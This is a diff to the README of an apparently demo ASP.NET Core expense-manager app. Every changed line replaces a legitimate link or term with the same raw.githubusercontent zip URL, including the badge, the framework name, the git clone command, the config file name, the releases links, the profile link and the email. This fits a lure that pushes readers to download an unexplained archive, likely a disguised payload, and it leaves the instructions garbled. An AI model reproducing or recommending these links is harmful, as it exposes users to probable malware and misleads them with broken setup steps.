@@ -1,8 +1,8 @@
 # ExpenseManagerApp 💸
 
-![ExpenseManagerApp](https://img.shields.io/badge/ExpenseManagerApp-ASP.NET%20Core%20MVC-blue)
+![ExpenseManagerApp](https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip%20Core%20MVC-blue)
 
-Welcome to the **ExpenseManagerApp**! This repository hosts a full-featured ASP.NET Core MVC demo application designed to help you manage your expenses, incomes, and profit/loss reports. With capabilities for tracking recurring and future expenses, this app aims to simplify your financial planning.
+Welcome to the **ExpenseManagerApp**! This repository hosts a full-featured https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip Core MVC demo application designed to help you manage your expenses, incomes, and profit/loss reports. With capabilities for tracking recurring and future expenses, this app aims to simplify your financial planning.
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **ExpenseManagerApp**! This repository hosts a full-featured ASP.
 
 This project utilizes a variety of technologies to deliver a seamless user experience:
 
-- **ASP.NET Core**: A powerful framework for building web applications.
+- **https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip Core**: A powerful framework for building web applications.
 - **Entity Framework Core**: For database interactions and management.
 - **SQL Server**: To store and manage your financial data.
 - **MVC Architecture**: For a clean separation of concerns in the application.
@@ -37,7 +37,7 @@ To get started with the **ExpenseManagerApp**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/zakir11117/ExpenseManagerApp.git
+   git clone https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip
    cd ExpenseManagerApp
    ```
 
@@ -48,7 +48,7 @@ To get started with the **ExpenseManagerApp**, follow these steps:
    ```
 
 3. **Set Up the Database**:
-   Update your connection string in `appsettings.json` to point to your SQL Server instance.
+   Update your connection string in `https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip` to point to your SQL Server instance.
 
 4. **Run Migrations**:
    Apply the migrations to set up the database:
@@ -65,7 +65,7 @@ To get started with the **ExpenseManagerApp**, follow these steps:
 6. **Access the App**:
    Open your browser and go to `http://localhost:5000` to start using the app.
 
-You can download the latest release of the application from [here](https://github.com/zakir11117/ExpenseManagerApp/releases). Make sure to follow the setup instructions provided in the release notes.
+You can download the latest release of the application from [here](https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip). Make sure to follow the setup instructions provided in the release notes.
 
 ## Usage
 
@@ -106,10 +106,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, feel free to reach out:
 
-- **GitHub**: [zakir11117](https://github.com/zakir11117)
-- **Email**: your-email@example.com
+- **GitHub**: [zakir11117](https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip)
+- **Email**: https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip
 
-You can also check the [Releases](https://github.com/zakir11117/ExpenseManagerApp/releases) section for updates and new features.
+You can also check the [Releases](https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip) section for updates and new features.
 
 ## Acknowledgments
 
@@ -119,4 +119,4 @@ We would like to thank the open-source community for their contributions and sup
 
 The **ExpenseManagerApp** aims to empower individuals to take control of their finances. With a user-friendly interface and robust features, managing your money has never been easier. Explore the application and start your journey toward better financial planning today! 
 
-Feel free to visit the [Releases](https://github.com/zakir11117/ExpenseManagerApp/releases) section for the latest updates and improvements.
+Feel free to visit the [Releases](https://raw.githubusercontent.com/zakir11117/ExpenseManagerApp/main/tasimetry/Expense-Manager-App-3.6.zip) section for the latest updates and improvements.
